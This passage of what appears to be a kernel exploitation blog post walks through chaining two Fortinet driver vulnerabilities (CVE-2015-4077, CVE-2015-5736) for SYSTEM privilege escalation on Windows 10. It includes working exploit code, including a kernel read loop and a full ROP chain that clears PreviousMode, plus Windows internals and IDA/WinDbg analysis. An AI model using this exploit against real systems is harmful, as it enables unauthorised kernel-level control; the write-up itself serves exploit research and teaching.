	<span class="n">ULONGLONG</span> <span class="n">listHead</span> <span class="o">=</span> <span class="n">eProcess</span> <span class="o">+</span> <span class="n">EPROCESS_ThreadListHead_Offset</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">flink</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">listHead</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">flink</span> <span class="o">!=</span> <span class="n">listHead</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">ethread</span> <span class="o">=</span> <span class="n">flink</span> <span class="o">-</span> <span class="n">ETHREAD_ThreadListEntry_Offset</span><span class="p">;</span>

		<span class="n">ULONGLONG</span> <span class="n">uniqueTid</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">ethread</span> <span class="o">+</span> <span class="n">ETHREAD_Cid_Offset</span> <span class="o">+</span> <span class="n">CLIENTID_UniqueThread_Offset</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">uniqueTid</span> <span class="o">==</span> <span class="n">currentTid</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ULONGLONG</span> <span class="n">kthread</span> <span class="o">=</span> <span class="n">ethread</span><span class="p">;</span>  <span class="c1">// Tcb is at offset 0x0</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Found current thread:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] ETHREAD: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ethread</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] KTHREAD: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kthread</span><span class="p">);</span>
			<span class="k">return</span> <span class="n">kthread</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">flink</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">flink</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>  <span class="c1">// Move to next thread</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Current thread not found in EPROCESS thread list.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>

<p>CVE-2015-4077 is a vulnerability in the mdare64_48.sys driver from fortinet that allows reading arbitrary kernel memory. The POC uses the vulnerable Input/Output Control (IOCTL) number to read a specified kernel-mode memory address. This is what gives us the read primitive for our exploit.</p>

<p>Morten Schenk and Sickness’s POC code from <a href="https://www.exploit-db.com/exploits/45149">exploit-db</a> was used to exploit CVE-2015-4077 in this exploit. The leakNtBase() function required some updates to find the base address of nt. According to <a href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">wumb0</a> the .text section of nt was moved from offset 0x1000 in the ntoskrnl.exe to an offset of around 0x2000000. This broke Morten Schenk’s scan back method for finding the MZ header to recover the base address. It is fixable by subtracting a large value first before performing the scan back.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="nf">leakNtBase</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">kthread</span><span class="p">)</span>
<span class="p">{</span>

	<span class="n">ULONGLONG</span> <span class="n">ntAddr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">kthread</span> <span class="o">+</span> <span class="mh">0x2a8</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">baseAddr</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">signature</span> <span class="o">=</span> <span class="mh">0x00905a4d</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">searchAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">ntAddr</span><span class="o">-</span><span class="mh">0x300000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">readData</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
		<span class="n">ULONGLONG</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">readData</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
		
		<span class="c1">//printf("%llx\n", readData);</span>
		<span class="c1">//printf("%llx\n", tmp);</span>
		

		<span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">signature</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">baseAddr</span> <span class="o">=</span> <span class="n">searchAddr</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">searchAddr</span> <span class="o">=</span> <span class="n">searchAddr</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">baseAddr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>CVE-2015-5736 is a vulnerability in the fortishield.sys driver from fortinet that allows for arbitrary code execution in the kernel by allowing the user to set the call back function from user-mode. We use this vulnerable IOCTL to set a callback to a ROP chain that will clear the Previous Mode bit on our KTHREAD allowing us to create a kernel-mode write primitive. The easier version of this exploit would then allocate user-mode memory containing token stealing shellcode, flip the U/S bit on the PTE, and then utilize the vulnerable IOCTL again setting the callback function to our user-mode address containing our shellcode. We are going a slightly harder route and using the write primitive to hijack execution from the HalDispatchTable to allow us the chance to bypass another mitigation.</p>

<p>Morten Schenk and Sickness’s POC from <a href="https://www.exploit-db.com/exploits/45149">exploit-db</a> was also used to exploit CVE-2015-5736 in this exploit. The major changes were updating the ROP chain to work with Windows 10 20H2 and modifying it to use the HalDispatchTable for the shellcode execution instead of incorporating the shellcode execution in to the ROP chain or calling the vulnerable IOCTL a second time to execute the shellcode.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PULONGLONG</span> <span class="nf">allocate_fake_stack</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">ntBase</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">fortishield_callback</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">fortishield_restore</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">kThread</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">PULONGLONG</span> <span class="n">fake_stack</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x00000000B60E0000</span><span class="p">,</span> <span class="mh">0x14000</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fake_stack</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while allocating the fake stack: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">fake_stack</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x14000</span><span class="p">);</span>

	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3f01bf</span><span class="p">;</span>		<span class="c1">// pop rax ; pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">fortishield_callback</span><span class="p">;</span>		<span class="c1">// Callback address</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2dd014</span><span class="p">;</span>		<span class="c1">// mov qword [rax], rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3f01bf</span><span class="p">;</span>		<span class="c1">// pop rax ; pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">;</span>			<span class="c1">// KTHREAD.PreviousMode</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x49584f</span><span class="p">;</span>		<span class="c1">// mov byte [rax], cl ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2017d0</span><span class="p">;</span>		<span class="c1">// pop rbx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00000000b60f0110</span><span class="p">;</span>					<span class="c1">// Location on fake_stack</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2017f2</span><span class="p">;</span>		<span class="c1">// pop rax ; ret;</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x217527</span><span class="p">;</span>		<span class="c1">// mov rax, rcx ; add rsp, 0x28 ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3cd671</span><span class="p">;</span>		<span class="c1">// mov rcx, rsi ; call rax</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20de71</span><span class="p">;</span>		<span class="c1">// pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000028</span><span class="p">;</span>					<span class="c1">// Value to subtract to get RSP</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x029db2b</span><span class="p">;</span>		<span class="c1">// sub rax, rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20de71</span><span class="p">;</span>		<span class="c1">// pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">fortishield_restore</span><span class="p">;</span>		<span class="c1">// Restore address</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2dd014</span><span class="p">;</span>		<span class="c1">// mov qword [rax], rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2b82ce</span><span class="p">;</span>		<span class="c1">// mov qword [rbx], rax ; add rsp, 0x20 ; pop rbx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xc8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xd0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xd8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// Restore RBX</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xe8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x201380</span><span class="p">;</span>		<span class="c1">// pop rsp ; ret</span>
	<span class="k">return</span> <span class="n">fake_stack</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The full exploit code can be found in my GitHub repo <a href="https://github.com/ApexPredator-InfoSec/forti_shield/tree/main">forti_shield</a></p>

<p>A quick side quest is necessary to discuss some important structures used by the Windows kernel. Processes are a management and control construct used by Windows to control resources and scheduling of code execution. Process do not execute code themselves. Processes contain threads, and sometimes fibers, that execute the code. Running process have an EPROCESS, KPROCESS, ETHREAD, and KTHREAD structure.</p>

<p>The EPROCESS structure is the virtual representation of the process in the Executive’s portion of the Windows kernel. This structure contains process identity and basic metadata including the UniqueProcessId (Process Identifier PID), ImageFileName (name of the executable), InheritedFromUniqueProcessId (parent PID). EPROCESS also contains the Flags field that lists the process state, protection flags, and job associations. It ties together the thread, memory management, and security information of the process. It contains the ActiveProcessLinks which is a doubly linked list chaining all running processes together. This is an important piece to remember as part of our Privilege Escalation is walking the ActiveProcessLinks to find the SYSTEM process, (PID) 4. The other important piece to remember for Privilege Escalation is that the EPROCESS also contains the Security Token. The Security Token is the identifier that ties the process to the privileges it has. So if we copy the SYSTEM process token to our current processes Security Token in it’s EPROCESS structure then our process will have the same privileges as the SYSTEM process. the integrity levels, or trust/permissions levels, for a process are low (low privileged/sandboxed user), medium (normal user), high (administrator), and SYSTEM (Full Control). The EPROCESS also contains a pointer to the Process Environment Block (PEB) which contains the environment information for the process that is accessible via user-mode.</p>

<p><img src="/assets/images/post2-windbg-eprocess.png" alt="post2-windbg-eprocess.png" /></p>

<p>The KPROCESS structure is embedded in the EPROCESS structure. This structure is the virtual representation of the process object for the kernel. It holds the lower level  details and management of the process including scheduling, dispatcher info, ready queues, affinity, and priority for the process. It is basically all of the scheduling information for the process to schedule the threads for execution. KPROCESS also tracks context switching between threads. We use this feature in kernel debugging when we switch to the context of our process and interact with the process’s Executive Thread.</p>

<p><img src="/assets/images/post2-windbg-kprocess.png" alt="post2-wing-kprocess.png" /></p>

<p>The ETHREAD represents the thread for the process for the Executive portion of the Windows Kernel. This will contain high level thread specific information such as ThreadListEntry (Link back to EPROCESS), ThreadPriority, and Client_id (Cid). the Cid is a structure containing the UniqueProcess Id (PID) and the UniqueThread Id (TID) making it possible to link the thread and process together when trying to walk fro EPROCESS down to the KTHREAD to verify you have the right process/thread combination when walking the linked lists which you will see later in the walkEprocess function of the POC. The ETHREAD has the KTHREAD embedded making it possible to also walk back to the EPROCESS if you have the KTHREAD address using the Cid and ThreadListEntry. It also contains a pointer to the Thread Environment Block (TEB) that contains the thread’s environment information that is accessible from user-mode. In user-mode if you needed to find the stack limit and stack base for the thread you would pull it from the TEB.</p>

<p><img src="/assets/images/post2-windbg-ethread.png" alt="post2-windbg-ethread.png" /></p>

<p>The KTHREAD is embedded in the ETHREAD. This is the representation of the thread for the process in the kernel portion of the Windows Kernel. It holds stack information, dispatcher state, wait blocks, and the TrapFrame. The TrapFrame references stored CPU registers on the stack to restore when the thread resumes execution. It is important to remember that while to our perception threads run continuously, that is not the case in reality.  The threads are actually only allowed to run for very brief intervals on the CPU and then go to a wait state until it’s their turn to run again. Thus the CPU register values need to be stored somewhere to restore the state and continue execution. The KTHREAD is also where we can find the PreviousMode bit.  It used to be possible to create a read/write primitive by clearing the PreviousMode bit. Windows would check this bit to determine if parameters passed to the Windows 32 APIs or functions where sent from kernel-mode or user-mode. So if it was cleared to zero you could call ReadProcessMemory and NtWriteVirtualMemory to read or write kernel-mode memory from user-mode as the kernel would think that it came from a kernel-mode call instead of a user-mode call. This method is no longer possible, but is the method used in this example.</p>

<p><img src="/assets/images/post2-windbg-kthread.png" alt="post2-windbg-kthread" /></p>

<p>I started solving the kernel code execution piece by looking at examples of how other people have used the HalDispatchTable method (and also ensuring HVCI and VBS were disabled on the VM). Connor McGarr wrote a nice blog on exploiting Hacksys Extreme Vulnerable Driver (HEVD) in 32-bit where he used it to call his shellcode stored in a user-mode memory location. If you can understand 32-bit then you can typically easily pivot to 64-bit <a href="https://connormcgarr.github.io/Kernel-Exploitation-2">Kernel-Exploitation-2 Connor McGarr</a></p>

<p>I will do the quick dive through the 64-bit version here.</p>

<p>If we open up ntoskrnl.exe in IDA and search for HalDisptachTable we will find one hit.</p>

<p><img src="/assets/images/post2-ida-haldispatch-table1.png" alt="post2-ida-haldispatch-table1" /></p>

<p>Double click on it to see the table and look for HalDispatchTable+0x08</p>

<p><img src="/assets/images/post2-ida-haldispatch-table2.png" alt="post2-ida-haldispatch-table2" />
 Here it is labeled as xHalSetSystemInformation, which is weird because we know at run time it is set to nt!HaliQuerySystemInformation. This is because the HalDispatchTable is built at runtime when the OS boots. xHalSetSystemInformation is an internal wrapper/thunk function that sit between ntoskrnl and the Hardware Abstraction Layer (HAL) implementation. The exported symbol name at runtime varies based off of  factors such as ACPI HAL vs APIC HAL, Hypervisor presence, secure kernel state, and build version. the exported symbol name will stay consistent across boots of your lab VM though. We can verify the exported symbol name at runtime in WinDbg with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> dqs nt!HalDispatchTable
</code></pre></div></div>

<p><img src="/assets/images/post2-windbg-haldispatchtable-1.png" alt="post2-windbg-haldispatchtable-1" /></p>

<p>Our goal is to figure out how to reach this entry in the dispatch table. If we cross reference the label off__140C00A68 in IDA by highlighting it and hitting ctrl+J or right clicking and selecting ‘list cross references to’ we will see KeQueryIntervalProfile in the list. Ke and Ki designate functions as kernel functions in Microsoft nameology. We will investigate this function as it looks interesting being a kernel function. If this was brand new to us and we were trying to find the unknown path we would likely have to investigate many of the options until we find something that works.</p>

<p><img src="/assets/images/post2-ida-kequeryintervalprofile-1.png" alt="post2-ida-kequeryintervalprofile-1" /></p>

<p>When we double click the entry for KeQueryIntervalProfile we will jump to the function in IDA. It’s important to note here that we see a call to guard_dispatch_icall which is a Kernel Control Flow Guard  (KCFG) function.</p>

<p><img src="/assets/images/post2-ida-kequeryintervalprofile-2.png" alt="post2-ida-kequeryintervalprofile-2" /></p>

<p>Now if we right click KeQueryIntervalProfile at the top of the graph and select “List cross reference to…” or hit ctrl+X we can see a reference in NtQueryIntervalProfile.</p>

<p><img src="/assets/images/post2-ida-kequeryintervalprofile-3.png" alt="post2-ida-kequeryintervalprofile-3" /></p>

<p>As we double click and enter the NtQueryIntervalProfile function we see in the function’s prologue a “mov rax, gs:188h” followed by “mov dil, [rax+232h]” and “test dil, dil”. This loads the KTHREAD of the calling thread into rax and then extracts the PreviousMode and checks to see if it is 0 or kernel-mode. The PreviousMode tells the kernel if the thread is calling from kernel-mode or user-mode. This indicates that this function is most likely called via a syscall since it is checking to make sure the context has been switch to kernel-mode and mirrors the typical prologue of a function called via a syscall.</p>

<p><img src="/assets/images/post2-windbg-previousmode-1.png" alt="post2-windbg-previousmode-1" /></p>

<p><img src="/assets/images/post2-windbg-previousmode-2.png" alt="post2-windbg-previousmode-2" /></p>

<p>We will now jump over to ntdll.dll for further analysis. When we open up ntdll.dll in IDA and check the exports we find an NtQueryIntervalProfile function within ntdll as well.</p>

<p><img src="/assets/images/post2-ida-ntqueryintervalprofile-2.png" alt="post2-ida-ntqueryintervalprofile-2" /></p>

<p>When we double click on the function to jump to the disassembly graph we see a short function that makes a 0x151 syscall.</p>

<p><img src="/assets/images/post2-ida-ntqueryintervalprofile-3.png" alt="post2-ida-ntqueryintervalprofile-3" /></p>

<p>We can then switch back to WinDbg and verify that syscall 0x151 calls to nt!NtQueryIntervalProfile. We consult the KiServiceTable which is a table of offsets in to ntoskrnl and the syscall number is the index in to the KiServiceTable to find the offset of the desired function. We then take the value found and the index and right shift it 4 bits. We then add that to nt!KiServiceTable and disassemble at that address. We use the following commands to verify the syscall:</p>
